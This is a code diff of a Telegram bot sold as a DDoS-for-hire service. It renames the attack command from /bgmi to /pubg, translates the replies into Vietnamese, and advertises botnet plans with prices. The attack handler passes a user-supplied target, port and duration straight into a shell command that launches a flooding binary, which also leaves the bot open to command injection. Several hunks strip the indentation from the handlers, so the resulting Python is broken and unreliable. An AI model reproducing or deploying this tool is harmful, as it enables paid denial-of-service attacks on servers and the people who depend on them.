@@ -106,10 +106,10 @@ def remove_user(message):
             else:
                 response = f"User {user_to_remove} not found in the list."
         else:
-            response = '''Please Specify A User ID to Remove. 
+            response = '''Hãy chọn định một ID người dùng để xóa.
  Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Chỉ Admin mới có quyền thực hiện lệnh này."
 
     bot.reply_to(message, response)
 
@@ -155,7 +155,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found"
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Chỉ Admin mới có quyền thực hiện lệnh này."
     bot.reply_to(message, response)
 
 
@@ -174,7 +174,7 @@ def show_recent_logs(message):
             response = "No data found"
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Chỉ Admin mới có quyền thực hiện lệnh này."
         bot.reply_to(message, response)
 
 
@@ -189,7 +189,8 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n"
+    response = f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀 
+\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: PUBG\n"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -198,7 +199,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['pubg'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -206,7 +207,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+                response = "Bạn đang bị khóa tạm thời. Vui lòng chờ 5 phút trước khi thực hiện lệnh /pubg một lần nữa.."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -220,16 +221,16 @@ def handle_bgmi(message):
             if time > 181:
                 response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/pubg', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./pubg {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"PUBG Attack successfully sent! Target: {target} Port: {port} Port: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\n"  # Updated command syntax
+            response = "Usage :- /pubg <TARGET> <PORT> <TIME> <METHOD>\n"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\n"
+        response = "Bạn không có quyền sử dụng lệnh này.\n"
 
     bot.reply_to(message, response)
 
@@ -251,18 +252,18 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command."
+        response = "Bạn không có quyền sử dụng lệnh này.."
 
     bot.reply_to(message, response)
 
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text = '''Available commands:
- /bgmi : Method For Bgmi Servers. 
- /rules : Please Check Before Use !!.
- /mylogs : To Check Your Recents Attacks.
- /plan : Checkout Our Botnet Rates.
+    help_text = '''Danh Sách Các Lệnh:
+ /pubg : Phương pháp tấn công server PUBG.
+ /rules : Xem quy định trước khi sử dụng !!
+ /mylogs : xem các cuộc tấn công gần đây của bạn.
+ /plan : Xem bảng giá và gói dịch vụ của botnet.
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
@@ -281,54 +282,59 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n"
-    bot.reply_to(message, response)
+response = (
+    f"Welcome to {user_name} Arthur DDoS Bot!\n\n"
+    "Tấn Công DDoS Miễn Phí Và Trả Phí\n\n"
+    "Type /help to see the attack usage!\n\n"
+    "----------------------------------------------\n\n"
+    "Best C2/API Of 2024 -> @Xiaocoderz🚀"
+)
+bot.reply_to(message, response)
+
 
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules:
+    response = f'''{user_name} Vui lòng tuân thủ các quy tắc sau:
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
+1. Không thực hiện quá nhiều cuộc tấn công cùng lúc!! nếu Không bạn sẽ bị cấm khỏi bot.
+2. Không được chạy 2 cuộc tấn công cùng lúc nếu không , bạn sẽ bị bot cấm.
+3. Chúng tôi theo dõi nhật ký hàng ngày, vì vậy hãy tuân thủ các quy định này để tránh bị cấm!!
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, Arthur DDoD C2 Vip
 
-Vip :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
+Vip Plan:
+-> Thời gian tấn công: 200 giây
+-> Giới hạn sau mỗi cuộc tấn công: 2 phút
+-> Số lượng tấn công đồng thời: 300
 
-Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
-
+Bảng giá:
+Ngày --> 50 VND
+Tuần --> 100 VND
+Tháng --> 250 VND
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
+    response = f'''{user_name}, Lệnh Admin Đã Được Kích Hoạt:
 
-/add <userId> : Add a User.
-/remove <userid> Remove a User.
-/allusers : Authorised Users Lists.
-/logs : All Users Logs.
-/broadcast : Broadcast a Message.
-/clearlogs : Clear The Logs File.
+/add <userId> : Triệu tập một thành viên mới vào hệ thống.
+/remove <userId> : Xóa sổ một tài khoản khỏi cơ sở dữ liệu.
+/allusers : Liệt kê các chiến binh đang hoạt động trong mạng lưới.
+/logs : Truy xuất toàn bộ lịch sử hoạt động.
+/broadcast : Truyền tải thông điệp tới tất cả node.
+/clearlogs : Xóa sạch mọi dấu vết từ các nhật ký.
 
 '''
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
@@ -336,19 +342,20 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users."
-        else:
-            response = "Please Provide A Message To Broadcast."
-    else:
-        response = "Only Admin Can Run This Command."
+            message_to_broadcast = "Thông Điệp Được Phát Từ Admin 🚀:\n\n" + command[1]
+with open(USER_FILE, "r") as file:
+    user_ids = file.read().splitlines()
+    for user_id in user_ids:
+        try:
+            bot.send_message(user_id, message_to_broadcast)
+        except Exception as e:
+            print(f"Không thể gửi thông điệp đến user {user_id}: {str(e)}")
+response = "Thông điệp đã được phát tới tất cả các node thành công."
+else:
+    response = "Hãy cung cấp thông điệp để phát tán."
+else:
+    response = "Chỉ Admin mới có quyền thực hiện lệnh này."
+
 
     bot.reply_to(message, response)
 
